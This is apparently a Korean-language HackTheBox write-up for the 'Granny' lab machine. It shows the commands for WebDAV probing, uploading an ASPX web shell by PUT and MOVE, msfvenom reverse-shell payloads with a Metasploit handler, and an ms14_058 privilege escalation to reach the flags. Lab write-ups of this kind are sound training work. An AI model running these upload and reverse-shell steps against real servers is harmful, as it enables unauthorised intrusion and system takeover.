# Granny - HackTheBox
## Recon
```bash
sudo nmap -p 80 -sC -sV -vv -oA granny 10.10.10.15
```
<img width="1105" height="346" alt="image" src="https://github.com/user-attachments/assets/cecb0294-faa7-49ac-80d8-729074df927d" />

- HTTP(80)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.10.15

curl -IL http://10.10.10.15
```
<img width="1105" height="384" alt="image" src="https://github.com/user-attachments/assets/776b0208-58fe-484a-994a-6d4598278224" />

### IIS Upload Web Shell
- `IIS` 서버에 허용되는 메소드 중에서 `PUT`과 `MOVE`가 눈에띄여 `davtest`를 사용해봄.
```bash
davtest -url http://10.10.10.15
```
<img width="1105" height="477" alt="image" src="https://github.com/user-attachments/assets/fc975a5f-0a03-4b63-ba5e-f109161c4741" />

<br>
<br>

- `aspx`파일을 직접 업로드 하지 못해 `txt`파일을 `cadaver`로 업로드 시도.
```
cp /usr/share/webshells/aspx/cmdasp.aspx .

mv cmdasp.aspx cmdasp.txt

cadaver http://10.10.10.15

put cmdasp.txt

move cmdasp.txt cmdasp.aspx
```
<img width="1105" height="505" alt="image" src="https://github.com/user-attachments/assets/af02df42-dee7-4b47-b243-658eb7af3d3c" />

<br>
<br>

- 명령어 실행 성공.
<img width="919" height="103" alt="image" src="https://github.com/user-attachments/assets/79f382eb-0003-443c-87d2-3505755c228c" />

<br>
<br>

- 웹셸로 리버스 셸 연결을 시도하였으나 실패.
- `msfvenom`으로 리버스 셸 코드 생성.
```bash
msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=80 -f aspx -o shell.aspx
```
<img width="1105" height="167" alt="image" src="https://github.com/user-attachments/assets/6b22606b-17b7-4f56-a9d4-0d38349fd244" />

<br>
<br>

- 리버스 셸 업로드.
```
mv shell.aspx shell.txt

put shell.txt

move shell.txt shell.aspx
```
<img width="1105" height="473" alt="image" src="https://github.com/user-attachments/assets/1882e697-9387-4ed6-a4fc-0ef53c92a94c" />

<br>
<br>

- 리버스 셸 연결 시도.
```bash
curl http://10.10.10.15/shell.aspx
```
<img width="1105" height="53" alt="image" src="https://github.com/user-attachments/assets/6a7b5bcb-9cc2-4117-badc-427e138e2964" />

<br>
<br>

- 셸 획득.
<img width="1105" height="209" alt="image" src="https://github.com/user-attachments/assets/518d0078-9cce-46eb-9722-5e6527cb11d2" />

---
## Privesc
- `SeImpersonatePrivilege` 권한이 있어서 여러 페이로드를 실행해보았으나 실패.
- OS 취약점 공략 실패.
- `metasploit` 사용하기로 결정하여 셸 생성.
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=80 -f aspx -o msf.aspx
```
<img width="1105" height="171" alt="image" src="https://github.com/user-attachments/assets/ed22132e-8f4d-4f3f-b903-d118ec1af815" />

<br>
<br>

- 업로드.
```
mv msf.aspx msf.txt

put msf.txt

move msf.txt msf.aspx
```
<img width="1105" height="171" alt="image" src="https://github.com/user-attachments/assets/8e4bcf5e-7046-41b2-9c4e-16b7c6b80b2b" />

<br>
<br>

- 리버스 셸 연결 시도.
```bash
curl http://10.10.10.15/msf.aspx
```
<img width="1105" height="54" alt="image" src="https://github.com/user-attachments/assets/598190d1-a3dd-452c-8e58-462890213f69" />

<br>
<br>

- 셸 획득.
```
use /multi/handler

set payload windows/meterpreter/reverse_tcp

set lhost tun0

set lport 80

run

shell
```
<img width="1105" height="188" alt="image" src="https://github.com/user-attachments/assets/627650c4-ea32-41e8-901f-400a23a6cf8c" />

<br>
<br>

- 백그라운드로 셸을 보낸 후 `local_exploit_suggester`를 실행.
```
bg

search suggester

use 0

set session 2

run
```
<img width="1105" height="319" alt="image" src="https://github.com/user-attachments/assets/0b7c7cb8-ee5f-4980-a26a-f8e22a35832f" />

<br>
<br>

- `ms14_058`취약점 시도하여 셸 획득.
```
search ms14_058

use 0

set session 2

set lhost tun0

set lport 80

run

shell
```
<img width="1105" height="196" alt="image" src="https://github.com/user-attachments/assets/352ea1cb-c2d3-4c94-90bb-da3645766b5d" />

---
## FLAG
- `C:\Documents and Settings\Lakis\Desktop\user.txt`
<img width="1106" height="253" alt="image" src="https://github.com/user-attachments/assets/ac1a997d-f8ce-4328-900e-64d5f5a3a88e" />

<br>
<br>

- `C:\Documents and Settings\Administrator\Desktop\root.txt`
<img width="1106" height="254" alt="image" src="https://github.com/user-attachments/assets/dc2e1478-1d36-49f1-b118-2908ba92d694" />










